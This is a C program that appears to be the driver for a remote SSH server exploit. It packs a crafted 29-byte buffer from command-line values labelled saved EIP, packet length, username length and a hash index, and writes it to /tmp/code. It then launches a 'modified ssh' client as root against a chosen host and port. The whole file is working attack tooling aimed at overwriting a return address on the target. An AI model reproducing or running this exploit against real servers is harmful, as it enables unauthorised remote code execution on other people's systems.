#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

/* Path to modified ssh */
#define PATH_SSH "./ssh"

int main(int argc, char *argv[])
{
    int f;
    int port;
    unsigned long addr, *ptr;
    char *buffer, *aux, ch, *ssh;
    int i;
    if (argc < 8)
    {
        printf("\nUsage: %s <saved eip> <count> <packet length> <username length> <host> <port> <h(i)>\n\n", argv[0]);
        fflush(stdout);
        exit(0);
    }
    port = atoi(argv[6]);
    buffer = (char *) malloc(29);
    ptr = (unsigned long *) buffer;
    *(ptr++) = 1543007393 + strtoul(argv[1], 0, 10);
    *(ptr++) = 0;
    *(ptr++) = strtoul(argv[7], 0, 10);
    *(ptr++) = 0;
    *(ptr++) = (29 + atoi(argv[2]))/sizeof(unsigned long);
    *(ptr++) = strtoul(argv[3], 0, 10);
    *(ptr++) = strtoul(argv[4], 0, 10);
    for (i = 0; i < 28; i += 4)
    {
        aux = buffer + i;
        ch = *aux;
        *aux = *(aux + 3);
        *(aux + 3) = ch;
        ch = *(aux + 1);
        *(aux + 1) = *(aux + 2);
        *(aux + 2) = ch;
    }
    printf("\nSaved Eip: &h + %u", 1543007393 + strtoul(argv[1], 0, 10));
    printf("\nReturn Address: 0x%x", 29 + atoi(argv[2]));
    printf("\nPacket Length: %u", (strtoul(argv[3], 0, 10) + 8) & ~7);
    printf("\nUsername Length: %u\n\n", strtoul(argv[4], 0, 10));
    fflush(stdout);
    f = open("/tmp/code", O_RDWR | O_CREAT, S_IRWXU);
    if (f == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    if (write(f, buffer, 29) != 29) {
        perror("write");
        exit(EXIT_FAILURE);
    }
    close(f);
    free(buffer);
    ssh = (char *) malloc(strlen(PATH_SSH) + 100 + strlen(argv[5]));
    strcpy(ssh, PATH_SSH);
    sprintf(ssh + strlen(PATH_SSH), " -p %i -v -l root %s", port, argv[5]);
    printf("%s\n", ssh);
    fflush(stdout);
    char *args[] = {PATH_SSH, "-p", argv[6], "-v", "-l", "root", argv[5], NULL};
    execvp(args[0], args);
    perror("execvp");
    free(ssh);
    exit(EXIT_FAILURE);
}
